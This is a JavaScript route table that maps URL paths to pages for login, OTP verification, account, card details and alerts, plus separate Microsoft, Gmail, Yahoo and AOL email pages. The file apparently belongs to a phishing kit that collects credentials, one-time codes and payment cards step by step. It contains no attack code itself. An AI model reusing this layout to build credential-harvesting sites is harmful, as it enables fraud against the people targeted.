import Login from "../pages/login";
import OTP from "../pages/otp";
import Email from "../pages/email";
import Account from "../pages/account";
import Card from "../pages/card";
import Microsoft from "../pages/microsoft";
import Gmail from "../pages/gmail";
import Yahoo from "../pages/yahoo";
import AOL from "../pages/aol";
import Information from "../pages/alert";

export const ROUTES = [
  {
    path: "/",
    component: Login,
  },
  {
    path: "/verification",
    component: OTP,
  },
  {
    path: "/email",
    component: Email,
  },
  {
    path: "/account",
    component: Account,
  },
  {
    path: "/card",
    component: Card,
  },
  {
    path: "/alert",
    component: Information,
  },
  {
    path: "/email/microsoft",
    component: Microsoft,
  },
  {
    path: "/email/gmail",
    component: Gmail,
  },
  {
    path: "/email/yahoo",
    component: Yahoo,
  },
  {
    path: "/email/aol",
    component: AOL,
  },
];
